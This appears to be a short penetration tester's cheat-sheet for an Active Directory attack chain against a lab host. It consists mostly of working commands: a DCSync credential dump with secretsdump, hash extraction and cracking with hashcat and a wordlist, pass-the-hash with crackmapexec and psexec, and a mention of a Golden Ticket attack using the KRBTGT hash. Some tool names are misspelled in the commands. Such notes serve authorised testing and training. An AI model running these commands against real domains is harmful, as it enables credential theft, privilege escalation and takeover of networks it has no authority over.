### kali
- Performing SecretsDump to perform a DCSync once you have hold of user associated with correct group
- Also added `domainobjectACL` to correct identity [how-to](./writeDACL.md)
```
./secretsdump.py null.local/nullbrain@10.10.10.10 > ./hases.out
```
^^ Above will be able to dump all of the secrets into ./hases.out


extract hashes with `| grep ::: | awk -F: '{print $4}'`
```
# 1000 = NTLM
hascat --user -m 1000 hases /opt/wordlist/rockyou.txt -r rules/InsidePro-PasswordsPro.rule

crackmapexec smb 10.10.10.10 -u administrator -H <hash>
```


- PSEXEC with Administrator to gain access
- Using the KRBTGT Hash to perform the GoldenTicket attack from Linux
```
./psexec.py -hashes xxxxxxx:xxxxxxxx administrator@10.10.10.10
```